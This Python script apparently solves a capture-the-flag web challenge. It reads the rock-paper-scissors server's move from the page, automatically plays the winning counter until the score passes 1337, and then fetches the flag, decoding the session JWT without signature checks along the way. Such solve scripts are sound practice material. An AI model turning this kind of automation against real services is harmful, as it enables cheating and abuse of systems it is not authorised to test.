import asyncio
import httpx
import jwt
from bs4 import BeautifulSoup

BASE_URL = 'https://rock-paper-scissors-eeb405317cfb5950.be.ax'


async def create_session(username):
    async with httpx.AsyncClient() as client:
        response = await client.post(f'{BASE_URL}/new',
                                     json={'username': username})
        if response.status_code == 200:
            print("Session created successfully")
            session_cookie = response.cookies.get('session')
            return session_cookie
        else:
            print("Failed to create session:", response.text)
            return None


async def get_computer_choice(client):
    response = await client.get(f'{BASE_URL}/')
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        current_choice = soup.find(id='current').text.strip()
        return current_choice
    else:
        print("Failed to get the computer's choice:", response.text)
        return None


async def simulate_wins(session_cookie, username, target_score):
    session_data = jwt.decode(session_cookie,
                              options={"verify_signature": False})
    headers = {'Authorization': f'Bearer {session_cookie}'}
    winning_choices = {'🪨': '📃', '📃': '✂️', '✂️': '🪨'}

    async with httpx.AsyncClient() as client:
        client.headers.update(headers)

        # Skip the first choice
        print("Skipping the first computer choice...")
        initial_choice = await get_computer_choice(client)
        print(f"First computer choice (skipped): {initial_choice}")
        await asyncio.sleep(
            0.1)  # Wait for a short period to get the next choice

        while True:
            await asyncio.sleep(
                0.1)  # Wait for 1 second before checking the computer's choice
            computer_choice = await get_computer_choice(client)
            if computer_choice:
                player_choice = winning_choices[computer_choice]

                response = await client.post(f'{BASE_URL}/play',
                                             json={'position': player_choice})
                if response.status_code == 200:
                    data = response.json()
                    if data['state'] == 'win':
                        score = data['score']
                        print(f"Win! Current score: {score}")
                        if score > target_score:
                            break
                    else:
                        print(f"Lost the game with score: {data['score']}")
                        break
                    await asyncio.sleep(1)
                else:
                    print("Failed to play the game:", response.text)
                    break


async def get_flag(session_cookie, username):
    headers = {'Authorization': f'Bearer {session_cookie}'}
    async with httpx.AsyncClient() as client:
        client.headers.update(headers)
        response = await client.get(f'{BASE_URL}/flag')
        if response.status_code == 200:
            print("Flag:", response.text)
        else:
            print("Failed to get flag:", response.text)


async def main():
    USERNAME = 'CTFPlayer'
    TARGET_SCORE = 1337  # Score needed to beat the high score

    session_cookie = await create_session(USERNAME)
    if session_cookie:
        await simulate_wins(session_cookie, USERNAME, TARGET_SCORE)
        await get_flag(session_cookie, USERNAME)


if __name__ == '__main__':
    asyncio.run(main())
